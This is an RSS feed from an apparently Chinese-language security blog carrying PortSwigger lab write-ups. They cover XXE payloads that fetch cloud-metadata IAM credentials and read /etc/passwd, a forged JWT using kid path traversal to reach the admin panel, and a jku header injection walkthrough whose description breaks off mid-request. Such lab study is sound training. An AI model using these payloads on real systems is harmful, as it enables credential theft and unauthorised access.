<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Portswigger on en1r0py</title><link>/tags/portswigger/</link><description>Recent content in Portswigger on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 04 Jan 2025 00:24:30 +0800</lastBuildDate><atom:link href="/tags/portswigger/index.xml" rel="self" type="application/rss+xml"/><item><title>Lab: Exploiting XXE to perform SSRF attacks</title><link>/portswigger-posts/xxe-lab-exploiting-xxe-to-perform-ssrf/</link><pubDate>Sat, 04 Jan 2025 00:24:30 +0800</pubDate><guid>/portswigger-posts/xxe-lab-exploiting-xxe-to-perform-ssrf/</guid><description>Lab description Solution 点击任意商品的View details，进入详情页后点击最下方的Check stock，对应请求为 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; 尝试修改productId为a POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID: a&amp;#34; 服务器将a返回，判断包含XXE注入，构造以下请求体(定义外部实体xxe，并使用关键字SYSTEM发送请求至指定url，最后将结果输出在productId标签)，发送请求后即可解题 POST /product/stock HTTP/2 &amp;lt;!DOCTYPE test [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID: { &amp;#34;Code&amp;#34; : &amp;#34;Success&amp;#34;, ... }&amp;#34;</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2025/xxe-lab-exploiting-xxe-to-perform-ssrf-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击任意商品的&lt;code>View details&lt;/code>，进入详情页后点击最下方的&lt;code>Check stock&lt;/code>，对应请求为
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>尝试修改&lt;code>productId&lt;/code>为&lt;code>a&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID: a&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>服务器将&lt;code>a&lt;/code>返回，判断包含XXE注入，构造以下请求体(定义外部实体&lt;code>xxe&lt;/code>，并使用关键字&lt;code>SYSTEM&lt;/code>发送请求至指定url，最后将结果输出在&lt;code>productId&lt;/code>标签)，发送请求后即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!DOCTYPE test [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&amp;#34;&amp;gt; ]&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Code&amp;#34; : &amp;#34;Success&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>Lab: Exploiting XXE using external entities to retrieve files</title><link>/portswigger-posts/xxe-lab-exploiting-xxe-to-retrieve-files/</link><pubDate>Fri, 03 Jan 2025 23:35:22 +0800</pubDate><guid>/portswigger-posts/xxe-lab-exploiting-xxe-to-retrieve-files/</guid><description>Lab description Solution 点击任意商品的View details，进入详情页后点击最下方的Check stock，对应请求为 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; 尝试修改productId为a POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID: a&amp;#34; 服务器将a返回，判断包含XXE注入，构造以下请求体(定义外部实体xxe，并使用关键字SYSTEM获取文件/etc/passwd，最后将结果输出在productId标签)，发送请求后即可解题 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2025/xxe-lab-exploiting-xxe-to-retrieve-files-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击任意商品的&lt;code>View details&lt;/code>，进入详情页后点击最下方的&lt;code>Check stock&lt;/code>，对应请求为
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>尝试修改&lt;code>productId&lt;/code>为&lt;code>a&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID: a&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>服务器将&lt;code>a&lt;/code>返回，判断包含XXE注入，构造以下请求体(定义外部实体&lt;code>xxe&lt;/code>，并使用关键字&lt;code>SYSTEM&lt;/code>获取文件&lt;code>/etc/passwd&lt;/code>，最后将结果输出在&lt;code>productId&lt;/code>标签)，发送请求后即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;!DOCTYPE root [
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt; ]&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;stockCheck&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/stockCheck&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID: root:x:0:0:root:/root:/bin/bash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>Lab: JWT authentication bypass via kid header path traversal</title><link>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-kid-header-path-traversal/</link><pubDate>Sun, 29 Dec 2024 13:48:36 +0800</pubDate><guid>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-kid-header-path-traversal/</guid><description>Lab description Solution 点击右上角My account并使用wiener:peter登录 登录后跳转至个人页面，请求如下 GET /my-account?id=wiener HTTP/2 Cookie: session=eyJraWQiOiI4MWYzOWI3ZC1mOWI5LTQwOWItOTNjZi0xMzkxYjM0NGEwNzEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTQ1NTIyOCwic3ViIjoid2llbmVyIn0.lxA_SxOvEcsSV3e6uCiU7PtnnUnGX_lHKJXCnSdVPAI 使用jwt.io修改JWT 修改JWT HEADER中的kid为../../../../../../../dev/null 修改JWT VERIFY SIGNATURE中的sub，填入your-256-bit-secret栏位为AA==(Base64 编码的空字节)，并勾选secret base64 encoded 修改JWT PAYLOAD中的sub为administrator 重放步骤2的请求，将上述修改后的jwt进行替换，并将url修改为admin GET /admin HTTP/2 Cookie: session=eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTQ1NTIyOCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.qquZdJuF4ac8Oos6_RR7SxjlCjq7WyV6aWeRJF-eO1A HTTP/2 200 OK &amp;lt;div&amp;gt; &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt; &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt; &amp;lt;/div&amp;gt; 修改上述请求url为/admin/delete?username=carlos并且再次发送请求，即可解题 GET /admin/delete?username=carlos HTTP/2 Cookie: session=eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTQ1NTIyOCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.qquZdJuF4ac8Oos6_RR7SxjlCjq7WyV6aWeRJF-eO1A HTTP/2 302 Found</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-kid-header-path-traversal-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上角&lt;code>My account&lt;/code>并使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>登录后跳转至个人页面，请求如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /my-account?id=wiener &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiI4MWYzOWI3ZC1mOWI5LTQwOWItOTNjZi0xMzkxYjM0NGEwNzEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTQ1NTIyOCwic3ViIjoid2llbmVyIn0.lxA_SxOvEcsSV3e6uCiU7PtnnUnGX_lHKJXCnSdVPAI&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>使用&lt;a href="https://jwt.io/">jwt.io&lt;/a>修改JWT
&lt;img alt="JWT" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-kid-header-path-traversal-2.jpg">&lt;/li>
&lt;li>修改&lt;code>JWT HEADER&lt;/code>中的&lt;code>kid&lt;/code>为&lt;code>../../../../../../../dev/null&lt;/code>&lt;/li>
&lt;li>修改&lt;code>JWT VERIFY SIGNATURE&lt;/code>中的&lt;code>sub&lt;/code>，填入&lt;code>your-256-bit-secret&lt;/code>栏位为&lt;code>AA==&lt;/code>(Base64 编码的空字节)，并勾选&lt;code>secret base64 encoded&lt;/code>&lt;/li>
&lt;li>修改&lt;code>JWT PAYLOAD&lt;/code>中的&lt;code>sub&lt;/code>为&lt;code>administrator&lt;/code>
&lt;img alt="Edit JWT" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-kid-header-path-traversal-3.jpg">&lt;/li>
&lt;li>重放步骤2的请求，将上述修改后的jwt进行替换，并将url修改为&lt;code>admin&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTQ1NTIyOCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.qquZdJuF4ac8Oos6_RR7SxjlCjq7WyV6aWeRJF-eO1A&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;div&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/div&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改上述请求url为&lt;code>/admin/delete?username=carlos&lt;/code>并且再次发送请求，即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin/delete?username=carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTQ1NTIyOCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.qquZdJuF4ac8Oos6_RR7SxjlCjq7WyV6aWeRJF-eO1A&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>Lab: JWT authentication bypass via jku header injection</title><link>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-jku-header-injection/</link><pubDate>Sat, 28 Dec 2024 14:24:21 +0800</pubDate><guid>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-jku-header-injection/</guid><description>Lab description Solution 点击右上角My account并使用wiener:peter登录 登录后跳转至个人页面，请求如下 GET /my-account?id=wiener HTTP/2 Cookie: session=eyJraWQiOiI1NzlmOGIxYi00YjNhLTQwZGUtODBmOC0zNGQ0ZjY4YzIyY2UiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTM4OTI1Mywic3ViIjoid2llbmVyIn0.V9Mwe_ylgCnRybT7TGTVZcEetuEbS3sI7t_86J7nTTz52YotdrcyQEBUchbLFksYIvRipTV9lYiF_64XVKtCJ-1nwU4_KyvjIa5JI5EyC_qAypLl-lDY5sGEzn1F75-jKN8RWMWsl68yI_jkCGpY36DZmifl6wgv9d0OMvu1tGxLLHodpJZxGzuRLR8-TbRCSJe3j-2NIFHcZsDSbnIXx1x7QSftT40v8cf__gcRAZME1XiyMAw3i9r7_6hNSCl4bxVD6lrirQ4zVE07Bw0K1PUrGMNRAmGRLcY5vp_ThFJCH-vn8fDZTjKMptEYOiPLXTLXSbKqxjbLhpf1WdJ62w 通过JWT Editor生成一对新的RSA密钥对，点击JWT Editor、New RSA key 复制RSA key内容如下 { &amp;#34;kty&amp;#34;: &amp;#34;RSA&amp;#34;, &amp;#34;e&amp;#34;: &amp;#34;AQAB&amp;#34;, &amp;#34;kid&amp;#34;: &amp;#34;af95551f-7444-4999-aa56-2b7575271ec4&amp;#34;, &amp;#34;n&amp;#34;: &amp;#34;oYon4kO8dQ_k9plM5huvUJDiEARxbI1nUKRIwfoB_lkenj2luei0K8aUxhxqZnGpAHJtIscyNmeJyLh-HPdcdfRPvy3Dvsu4dSiv0jCfnCtid2gI5ckFXmchbaTwuvadDHJOJ03VFC4zCH7cANZZJcgnr9IoGuiT8oFs_eO4BwSG6zAFTKn4ZL3kaa-hPZd-ygw2W85m_C0Jc5GZ-RaPaqsK3uAlNcQaQZr2AxWbp9wXotvxrdV4lUO5QKNAqldV7NLwfLmCThsb9GWBXVWQCg9YrkGSwRTWCUm-ZMgk2IvETetVU-aaGGzZBI_cgKOJdtzbLvBhIrIorRvbvSSFhw&amp;#34; } 点击上方Go to exploit server，将Body部分的内容替换为如下的空JWK集合，并将步骤4的复制内容贴入keys中，并点击Store { &amp;#34;keys&amp;#34;: [ ] } 将步骤2请求发送至Burp Repeater，点击JSON Web Token 更新JWT header中的的kid为步骤4的kid，并新增jku字段为exploit server url，更新JWT body中的sub为administrator 点击Sign，确保选中Don't modify header选项，点击ok 将url修改为/admin并发送请求 GET /admin HTTP/2 Cookie: 